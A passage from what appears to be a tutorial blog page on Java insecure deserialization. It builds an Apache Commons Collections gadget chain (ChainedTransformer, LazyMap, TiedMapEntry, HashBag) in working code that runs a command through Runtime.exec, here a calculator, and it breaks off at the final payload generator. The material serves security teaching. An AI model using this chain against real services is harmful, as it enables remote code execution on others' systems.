+</span><span class='line'>            <span class="n">Map</span> <span class="n">lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">dict</span><span class="o">,</span> <span class="k">new</span> <span class="nf">MyReverse</span><span class="o">());</span>  <span class="c1">// MyReverse implements transformer</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">lazymap</span><span class="o">);</span>  <span class="c1">// inspect  the lazymap object status</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span>  <span class="c1">// inspect the underlying HashMap status: result =&gt; both are same</span>
+</span><span class='line'>            <span class="c1">// lazymap just acts as a wrapper around HashMap,</span>
+</span><span class='line'>            <span class="c1">// when no key is found then it generates the value and update HashMap with that new entry</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">lazymap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;asinha&quot;</span><span class="o">));</span>  <span class="c1">// search with a valid key</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span> <span class="c1">// check the underlying Map status, no entry is added</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// invalid key =&gt; invokes the transform() method to generate a value through transform() method</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">out</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">lazymap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&quot;alice&quot;</span><span class="o">);</span>  <span class="c1">// transform() method will be called</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">out</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span>  <span class="c1">// new entry has been added into the underlying HashMap</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120223312696.png" alt="image-20191120223312696" /></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120222926864.png" alt="image-20191120222926864" /></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120223152778.png" alt="image-20191120223152778" /></p>
+
+<h3>Command Execution by <code>combining</code> ChainedTransformer and LazyMap</h3>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept10</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+</span><span class='line'>                    <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+</span><span class='line'>                            <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">}),</span>
+</span><span class='line'>            <span class="o">};</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="o">();</span>
+</span><span class='line'>            <span class="c1">// Map lazyMap = LazyMap.decorate(hashMap, new MyReverse());</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">key</span> <span class="o">=</span> <span class="s">&quot;invalid_key&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="c1">// trying the add an entry to the HashMap</span>
+</span><span class='line'>            <span class="n">lazyMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>  <span class="c1">// this triggers the cmd execution</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">hashMap</span><span class="o">);</span>  <span class="c1">// an entry wil be added into the HashMap</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h3>TiedMapEntry</h3>
+
+<ol>
+<li>This can be used to <code>enable</code> a <code>Map</code> entry to <code>make changes</code> on the <code>underlying</code> map.</li>
+<li><code>tiedmapentry.getValue()</code> method => <code>lazymap.get(this.key)</code> method.</li>
+<li><strong>Key Point:</strong> <code>tiedmapentry.hashcode()</code> method => <code>tiedmapentry.getValue()</code> method.</li>
+</ol>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept11</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understanding tiedmapentry</span>
+</span><span class='line'>            <span class="c1">// HashMap implements the Map interface so we can create Map type object also</span>
+</span><span class='line'>            <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Integer</span><span class="o">&gt;</span> <span class="n">dict</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Integer</span><span class="o">&gt;();</span>
+</span><span class='line'>            <span class="n">dict</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;asinha&quot;</span><span class="o">,</span> <span class="mi">9</span><span class="o">);</span>  <span class="c1">// add an entry</span>
+</span><span class='line'>            <span class="n">dict</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;bob&quot;</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>  <span class="c1">// add another entry</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// method definition =&gt; decorate(Map map, Transformer factory)</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">dict</span><span class="o">,</span> <span class="k">new</span> <span class="nf">MyReverse</span><span class="o">());</span>  <span class="c1">// MyReverse implements transformer</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span>  <span class="c1">// inspect the underlying HashMap status: result =&gt; both are same</span>
+</span><span class='line'>            <span class="c1">// lazymap just acts as a wrapper around HashMap,</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">valid_key</span> <span class="o">=</span> <span class="s">&quot;asinha&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">TiedMapEntry</span> <span class="n">tiedmapentry</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">TiedMapEntry</span><span class="o">(</span><span class="n">lazymap</span><span class="o">,</span> <span class="n">valid_key</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">tiedmapentry</span><span class="o">);</span>  <span class="c1">// inspect the tiedmapentry object status</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span>  <span class="c1">// inspect the underlying HashMap status</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">invalid_key</span> <span class="o">=</span> <span class="s">&quot;invalid_key&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">TiedMapEntry</span> <span class="n">tme</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">TiedMapEntry</span><span class="o">(</span><span class="n">lazymap</span><span class="o">,</span> <span class="n">invalid_key</span><span class="o">);</span>  <span class="c1">// any invalid key invokes transform() method</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="kt">int</span> <span class="n">res</span> <span class="o">=</span> <span class="n">tme</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>  <span class="c1">// it intern calls tme.getValue()</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">res</span><span class="o">);</span>  <span class="c1">// hashcode</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span>  <span class="c1">// a new entry is added to the underlying HashMap</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120230402262.png" alt="image-20191120230402262" /></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120230500084.png" alt="image-20191120230500084" /></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120230532545.png" alt="image-20191120230532545" /></p>
+
+<h3>HashBag</h3>
+
+<ol>
+<li>A Collection that <code>counts</code> the number of times an object <code>appears</code> in the collection.</li>
+<li>Backed by an internal <code>HashMap</code> object.</li>
+<li>While adding any Object, first it&rsquo;s <code>hashcode()</code> is calculated. Based on that hashcode/index, it updates the underlying <code>HashMap</code> table entry.</li>
+<li><strong>Key Point:</strong> <code>hashbag.add(tiedmapentry)</code> method => <code>tiedmapentry.hashcode()</code> method.</li>
+</ol>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.bag.HashBag</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept12</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understanding HashBag</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">dict</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashMap</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">dict</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;asinha&quot;</span><span class="o">,</span> <span class="mi">9</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">Map</span> <span class="n">lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">dict</span><span class="o">,</span> <span class="k">new</span> <span class="nf">MyReverse</span><span class="o">());</span>  <span class="c1">// chainedTransformer.transform() will be called</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">invalid_key</span> <span class="o">=</span> <span class="s">&quot;invalid_key&quot;</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// Create a TiedMapEntry with the underlying map as our `lazyMap` and an invalid key</span>
+</span><span class='line'>            <span class="n">TiedMapEntry</span> <span class="n">tiedmapentry</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">TiedMapEntry</span><span class="o">(</span><span class="n">lazymap</span><span class="o">,</span> <span class="n">invalid_key</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">HashBag</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashBag</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">b</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">tiedmapentry</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">dict</span><span class="o">);</span>  <span class="c1">// a new entry is added to the underlying HashMap of tiedmapentry object</span>
+</span><span class='line'>            <span class="c1">// format =&gt; count: object</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>  <span class="c1">// key = tiedmapentry(it&#39;s HashMap is updated), value = count</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/image-20191120232856545.png" alt="image-20191120232856545" /></p>
+
+<h3>Recap</h3>
+
+<ol>
+<li>Create a <code>TiedMapEntry</code> with a underlying <code>lazyMap</code> and key is <code>String</code> -> &lsquo;invalid_key&rsquo;.</li>
+</ol>
+
+
+<blockquote><ol>
+<li>This <code>LazyMap</code> is backed by an empty <code>HashMap.</code></li>
+<li>This <code>LazyMap</code> can also use the factory class <code>ChainedTransformer</code> that generates a value dynamically through the <code>transform()</code> method when presented with an <code>invalid</code> key.</li>
+<li><strong>Key Point:</strong> Finally it updates that entry(i.e key:value pair) into the <code>HashMap</code>.</li>
+<li>As the initial <code>HashMap</code> is empty, so any <code>key</code> supplied through <code>TiedMapEntry</code> can trigger the <code>transform()</code> method.</li>
+</ol>
+</blockquote>
+
+<ol>
+<li><p>Then <code>add</code> the <code>tiedmapentry</code> Object into a <code>HashBag</code> instance.</p></li>
+<li><p><code>hashbag.add(tiedmapentry)</code> => <code>tiedmapentry.hashcode()</code> => <code>lazymap.get(this.key)</code> => <code>chainedtransformer.transform(key)</code> => <code>Runtime.getRuntime().exec("/usr/bin/gnome-calculator");</code></p></li>
+</ol>
+
+
+<h3>Detailed Back-trace</h3>
+
+<pre><code class="java">add(Object object)  // IMP
+    =&gt; add(Object object, int nCopies)
+        =&gt; HashMap.get(Object)
+            =&gt; int hash(Object key)
+                =&gt; tidemapentry.hashCode();  // IMP
+                    =&gt; tidemapentry.getValue();
+                        =&gt; lazymap.get(this.key);  // IMP
+                            =&gt; this.factory.transform(key);  // IMP
+                                =&gt; Runtime.getRuntime().exec("/usr/bin/gnome-calculator")
+</code></pre>
+
+<h3>The Problem</h3>
+
+<p>We can serialize this <code>HashBag</code> object to generate the payload but during the serialization process, <code>lazymap.get("invalid_key")</code> is called once. So the underlying <code>HashMap</code> is <code>updated</code> with the <code>invalid_key:derived_value</code> entry.</p>
+
+<p>During deserialization process, when <code>TiedMapEntry.hashcode()</code> => <code>lazymap.get(this.key)</code> call occurs, then <code>ChainedTransformer.transform(key)</code> method will not be called because <code>LazyMap</code> does not need to derive the value for that key again through the <code>transform()</code> method. Underlying <code>HashMap</code> is already <code>updated</code> with the entry.</p>
+
+<h3>The Solution</h3>
+
+<p>The most important thing to taken care is</p>
+
+<ol>
+<li>During the serialization process, we need to wrap a <code>TiedMapEntry</code> Object inside a <code>HashBag</code> object, but somehow we need to <code>stop</code> the invocation of <code>TiedMapEntry.hashcode()</code> method when we add the TidemapEntry object into the <code>HashBag's</code> <code>HashMap</code> via  <code>add()</code> method.</li>
+<li>If we can do this, then the underlying <code>LazyMap's</code> <code>HashMap</code> won&rsquo;t get <code>updated</code> with the <code>invalid_key:derived_value</code> entry.</li>
+</ol>
+
+
+<h4>Strategy to overcome the challenge</h4>
+
+<ol>
+<li>Create a <code>HashBag</code> instance and add any <code>Object</code> into it.</li>
+<li>This will invoke Object’s <code>hashcode()</code> method and based on the hashcode / index, the underlying <code>HashBag's</code> => <code>HashMap</code> table entry will be updated with <code>key = Object</code> and <code>value / count = 1</code>.</li>
+<li>Now using <code>mokito</code> library, modify that <code>HashBag's</code> => <code>HashMap’s</code> <code>first</code> entry in <code>memory</code>.
+
+<ul>
+<li>Replace that <code>Object</code> with <code>TiedMapEntry</code> Object.</li>
+<li>We have added only one entry due to that we are modifying the <code>first</code> entry.</li>
+</ul>
+</li>
+<li>As you can observe, till this point, <code>TiedMapEntry.hashcode()</code> is not called anywhere.</li>
+<li>Serialize this <code>HashBag</code> Object.</li>
+<li>During the deserialization process, the program tries to recreate the same object(i.e., <code>HashBag</code>) in the process memory.</li>
+<li>This <code>HashBag</code> => underlying <code>HashMap</code> table should be having one entry, where key= <code>TiedMapEntry</code> Object and count/ value =1. So, to recreate that entry inside the <code>HashBag's</code> HashMap&rsquo;s<code>table, the table's index needs to be known. Due to this,</code>TiedMapEntry.hashcode()` is called to calculate that index dynamically.</li>
+<li>Here the key point is, <code>TiedMapEntry.hashcode()</code> method is getting called the first time, which triggers the code execution.</li>
+</ol>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.bag.HashBag</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.mockito.internal.util.reflection.Whitebox</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
